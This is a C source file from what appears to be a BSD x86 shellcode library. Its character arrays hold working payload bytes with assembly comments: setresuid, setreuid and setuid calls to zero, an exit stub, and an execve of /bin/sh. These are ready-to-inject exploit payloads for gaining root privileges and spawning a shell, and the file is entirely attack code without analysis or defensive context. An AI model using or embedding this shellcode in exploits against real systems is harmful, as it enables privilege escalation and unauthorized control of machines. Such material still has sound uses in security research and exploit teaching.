/*
 *  $Id: bsd-x86-shellcode.c 40 2008-11-17 02:45:30Z ramon $
 *
 *  bsd-x86-shellcode.c
 *  Copyright 2004 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

char setresuidcode[]=       /*  12 bytes                          */
    "\x31\xc0"              /*  xorl    %eax,%eax                 */
    "\x50"                  /*  pushl   %eax                      */
    "\x50"                  /*  pushl   %eax                      */
    "\x50"                  /*  pushl   %eax                      */
    "\x50"                  /*  pushl   %eax                      */
    "\x66\xb8\x37\x01"      /*  movw    $0x0137,%ax               */
    "\xcd\x80"              /*  int     $0x80                     */
;

char setreuidcode[]=        /*  9 bytes                           */
    "\x31\xc0"              /*  xorl    %eax,%eax                 */
    "\x50"                  /*  pushl   %eax                      */
    "\x50"                  /*  pushl   %eax                      */
    "\x50"                  /*  pushl   %eax                      */
    "\xb0\x7e"              /*  movb    $0x7e,%al                 */
    "\xcd\x80"              /*  int     $0x80                     */
;

char setuidcode[]=          /*  8 bytes                           */
    "\x31\xc0"              /*  xorl    %eax,%eax                 */
    "\x50"                  /*  pushl   %eax                      */
    "\x50"                  /*  pushl   %eax                      */
    "\xb0\x17"              /*  movb    $0x17,%al                 */
    "\xcd\x80"              /*  int     $0x80                     */
;

char exitcode[]=            /*  7 bytes                           */
    "\x31\xc0"              /*  xorl    %eax,%eax                 */
    "\x50"                  /*  pushl   %eax                      */
    "\xb0\x01"              /*  movb    $0x01,%al                 */
    "\xcd\x80"              /*  int     $0x80                     */
;

char shellcode[]=           /*  23 bytes                          */
    "\x31\xc0"              /*  xorl    %eax,%eax                 */
    "\x50"                  /*  pushl   %eax                      */
    "\x68\x2f\x2f\x73\x68"  /*  pushl   $0x68732f2f               */
    "\x68\x2f\x62\x69\x6e"  /*  pushl   $0x6e69622f               */
    "\x89\xe3"              /*  movl    %esp,%ebx                 */
    "\x50"                  /*  pushl   %eax                      */
    "\x54"                  /*  pushl   %esp                      */
    "\x53"                  /*  pushl   %ebx                      */
    "\x50"                  /*  pushl   %eax                      */
    "\xb0\x3b"              /*  movb    $0x3b,%al                 */
    "\xcd\x80"              /*  int     $0x80                     */
;

